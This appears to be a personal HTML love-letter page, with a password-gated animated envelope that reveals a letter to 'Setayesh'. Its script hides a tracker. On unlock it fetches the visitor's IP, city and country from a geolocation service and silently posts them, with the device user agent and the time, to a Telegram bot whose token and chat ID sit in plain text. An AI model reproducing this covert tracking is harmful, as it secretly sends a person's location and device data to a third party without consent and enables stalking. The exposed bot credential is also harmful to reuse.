<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sorry baby</title>

<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500&family=Inter:wght@300;400&display=swap" rel="stylesheet">

<style>
:root{--neon:#ff2bd6;}

*{margin:0;padding:0;box-sizing:border-box;}

body{
 height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
 background:#000;
 font-family:'Inter',sans-serif;
 overflow:hidden;
}

#loginScreen{
 position:fixed;
 inset:0;
 display:flex;
 justify-content:center;
 align-items:center;
 z-index:9999;
}

#loginScreen input{
 padding:12px 18px;
 background:#111;
 border:1px solid var(--neon);
 border-radius:8px;
 color:#fff;
 outline:none;
 box-shadow:0 0 15px var(--neon);
 font-size:16px;
}

#bg-video{
 position:fixed;
 inset:0;
 width:100%;
 height:100%;
 object-fit:cover;
 z-index:-2;
 filter:brightness(.35);
}

.scene{perspective:1600px;}

.envelope-wrapper{
 position:relative;
 width:360px;
 height:240px;
 cursor:pointer;
 transform-style:preserve-3d;
 transition:.8s;
}

.envelope-wrapper.open{
 transform:translateY(-20px) rotateX(10deg);
}

.envelope{
 position:absolute;
 width:100%;
 height:100%;
 border:1px solid var(--neon);
 border-radius:14px;
 backdrop-filter:blur(14px);
 box-shadow:0 0 40px var(--neon);
}

.flap{
 position:absolute;
 width:100%;
 height:130px;
 background:rgba(255,43,214,.25);
 clip-path:polygon(0 0,100% 0,50% 100%);
 transform-origin:top;
 transition:.8s;
}

.envelope-wrapper.open .flap{
 transform:rotateX(180deg);
}

.letter{
 position:absolute;
 width:88%;
 left:6%;
 top:30px;
 padding:30px;
 background:#111;
 color:#fff;
 border-radius:12px;
 transform:translateY(85%);
 opacity:0;
 transition:1.2s;
 box-shadow:0 0 35px var(--neon);
 white-space:pre-line;
}

.envelope-wrapper.open .letter{
 transform:translateY(-40%);
 opacity:1;
 height:420px;
 overflow:auto;
}

h2{
 color:#ff8df5;
 margin-bottom:15px;
 text-shadow:0 0 10px var(--neon);
}

#flare{
 position:fixed;
 inset:0;
 background:radial-gradient(circle,rgba(255,43,214,.25),transparent 60%);
 opacity:0;
 pointer-events:none;
 transition:.7s;
}
</style>
</head>
<body>

<div id="loginScreen">
<input type="password" id="passwordInput" placeholder="Enter code" onkeypress="if(event.key==='Enter')unlockSite()">
</div>

<div id="flare"></div>

<video autoplay muted loop playsinline id="bg-video">
<source src="Rosita.mp4" type="video/mp4">
</video>

<div class="scene">
<div class="envelope-wrapper" id="envelope">
<div class="envelope"></div>
<div class="flap"></div>

<div class="letter">
<h2 id="title"></h2>
<p id="text"></p>
</div>

</div>
</div>

<audio id="audio" loop>
<source src="Lovly.mp3">
</audio>

<script>
/* PASSWORD base64 */
const encodedPassword="MDkzOTEyNzQwMjI=";

/* TELEGRAM */
const BOT_TOKEN="8217282145:AAES0_pMqeADQrCO6EE3UtbqWARkx6mQow0";
const CHAT_ID="8590623972";


async function sendTelegram(){
 try{
   const ip=await fetch("https://ipapi.co/json/").then(r=>r.json());
   const device=navigator.userAgent;

   const message=
`ðŸ’Œ Letter opened

Country: ${ip.country_name}
City: ${ip.city}
IP: ${ip.ip}

Device: ${device}

Time: ${new Date().toLocaleString()}
`;

   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:"POST",
     headers:{'Content-Type':'application/json'},
     body:JSON.stringify({
       chat_id:CHAT_ID,
       text:message
     })
   });
 }catch(e){}
}

/* unlock */
function unlockSite(){
 const input=document.getElementById("passwordInput").value;
 if(btoa(input)===encodedPassword){
   sendTelegram();
   document.getElementById("loginScreen").style.display="none";
   flare();
 }
}

/* flare */
function flare(){
 const f=document.getElementById("flare");
 f.style.opacity=.4;
 setTimeout(()=>f.style.opacity=0,800);
}

/* envelope */
const env=document.getElementById("envelope");
const audio=document.getElementById("audio");

env.onclick=()=>{
 env.classList.toggle("open");
 audio.play().catch(()=>{});
 startType();
};

/* typewriter */
const title="Dear Setayesh,";
const body=`Since the moment I saw you, my life really changed. Maybe it sounds dramatic, but you had no idea about my life, and I was honestly scared to let you know. Yet, you brought color to my world and lit up my heart.

During the time we were good together, you said things that gave me hope, and for the first time in my life, I felt truly loved.

Still, I remember every moment and word.

No matter what happens, Iâ€™m grateful.

Cian`;

function type(el,text,i=0,speed=35){
 if(i<text.length){
   el.innerHTML+=text[i];
   if(text[i]=="\n") flare();
   setTimeout(()=>type(el,text,i+1,speed),speed);
 }
}

function startType(){
 document.getElementById("title").innerHTML="";
 document.getElementById("text").innerHTML="";
 type(document.getElementById("title"),title,0,60);
 setTimeout(()=>type(document.getElementById("text"),body,0,35),1200);
}
</script>

</body>
</html>
